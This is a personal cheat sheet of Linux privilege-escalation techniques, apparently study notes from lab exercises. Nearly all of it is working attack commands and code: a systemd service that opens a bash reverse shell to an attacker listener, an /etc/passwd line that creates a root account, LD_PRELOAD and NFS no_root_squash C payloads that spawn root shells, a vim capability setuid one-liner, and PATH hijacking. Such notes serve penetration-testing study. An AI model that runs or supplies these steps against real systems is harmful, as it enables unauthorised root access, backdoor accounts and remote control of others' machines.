#### <u>Basics</u>
##### Enumeration
**Distribution version**
```shell
cat /etc/issue
```

**Linux version**
```shell
cat /proc/version
OR
uname -a
```

##### Make password for /etc/shadow
```shell
mkpasswd -m sha-512 [newpassword]
```
Replace the password in /etc/shadow or in /etc/passwd after the first `:` replacing the `x`
<small>Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.</small>
#### <u>Compiling C</u>
```shell
gcc [cve.c] -o [binary]
```
#### <u>Find SUID/GUID files</u>
```shell
find / -type f -perm -[u|g]=s -ls 2>/dev/null
OR
find / -type f -perm -04000 -ls 2>/dev/null
```
##### Possible scenarios
###### **/bin/systemctl** [source](https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49)
Create a service `root.service` with a reverse shell in it:
```shell
[Unit]
Description=rooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -id > & /dev/tcp/[LHOST]/[LPORT] 0>&1'

[Install]
WantedBy=multi-user.target
```
Then setup the listener and start de service
```shell
/bin/systemctl enable [path/to/service]
/bin/systemctl start root
```
#### <u>Exploit writable /etc/passwd</u>
Create a password
```bash
openssl passwd -1 -salt [salt] [password]
```

In /etc/passwd, put `[user]:[hashed passwd]:0:0:root:/root:/bin/bash` to create a superuser

`su [superuser]` to connect on it
#### <u>Sudo privileges</u>
```shell
sudo -l
```

###### LD_PRELOAD
![[gGstS69.png]]
If LD_PRELOAD is enabled, write the following `shell.c` file
```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```
Then compile in `.so`:
```shell
gcc -pfIC -shared -o shell.so shell.c -nostartfiles
```

Then use the sudo with an available NOPASSWD binary
```shell
sudo LD_PRELOAD=/tmp/shell.so find
```

#### <u>Environment variables</u>
If `sudo -l` hash some env vars, let's try [this](https://tryhackme.com/r/room/linuxprivesc#title-7)
#### <u>Shell through vi</u>
1. Start vi
2. press `:`
3. type `shell` and enter
4. here is the shell

#### <u>Get bash version</u>
If the version is <4.2-048 or 4.4, go [here](https://tryhackme.com/r/room/linuxprivesc#title-14)
```shell
/bin/bash --version
```
#### <u>Crontab</u>
```shell
cat /etc/crontab
```

Verify that the script has `+x` permission

#### <u>PATH</u>
If there is a SUID binary executed as root, figure out what command it does and create a new script to execute it before via
```shell
export PATH=/tmp:$PATH
```
The new script should be in /tmp, obviously. Don't forget the `chmod +x [script]`

#### <u>UDF Attack</u>
[Sqlmap libraries](https://github.com/sqlmapproject/sqlmap/tree/master/data/udf)
##### Mysql
If we are on root user in mysql, we may be able to do something

**Connect by terminal**
```shell
mysql -u root
```

**Get current user (in case of SQLi)**
```sql
SELECT current_user();
```

**[Raptor UDF exploit](https://tryhackme.com/r/room/linuxprivesc#title-2)**
[Medium](https://rootrecipe.medium.com/mysql-to-system-root-ad8edc305d2b): Can't get it to work properly atm



#### <u>Capabilities</u>
Capabilities gives the ability to change the SUID to 0 (root) through a "capable" binary
**List capabilities**
```shell
getcap -r / 2>/dev/null
```

![[Screenshot_2024-07-06_12-36-56.png]]

```shell
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c", "reset; exec sh")'
```
`-c` is for executing shell command


#### <u>Python shell</u>
```python
import subprocess
print(subprocess.run("ls /root", shell=True, capture_output=True, text=True).stdout)
```


#### <u>NFS</u>
NFS (Network File Sharing) configuration file is on
```shell
cat /etc/exports
```

If there is `no_root_squash`, we can make **root files** on the mounted directory and the root owner **will be replicated** on the target directory. Then we just have to set the **SUID bit** and execute the binary as root on the target's machine

**Everything should be done as root on my machine**

**Show mountable directory**
<small>Already shown in /etc/exports</small>
```shell
showmount -e [target]
```

**Mount the directory**
```Shell
sudo mount -o rw [target]:[directory] /tmp/[location]
```

**Create nfs.c**
```c
int main(){
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}
```

**Compile the nfs.c**
```shell
sudo gcc --static nfs.c -o nfs
```

**Set the SUID bit**
```shell
sudo chmod +s nfs
```

**Finally, execute the ./nfs on the target**
